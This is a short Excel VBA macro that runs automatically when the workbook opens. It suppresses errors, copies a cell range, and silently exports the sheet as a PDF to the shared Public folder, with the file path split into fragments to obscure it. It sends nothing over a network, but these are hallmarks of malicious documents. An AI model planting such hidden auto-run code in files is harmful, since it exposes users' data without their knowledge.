Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim rng As Object
    On Error Resume Next
    Set rng = ActiveSheet.Range("A1:B10")
    rng.Copy
    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, _
        Filename:="C:\Us" & "ers\Publ" & "ic\obl" & "ivionx" & "_format" & ".pdf"
End Sub
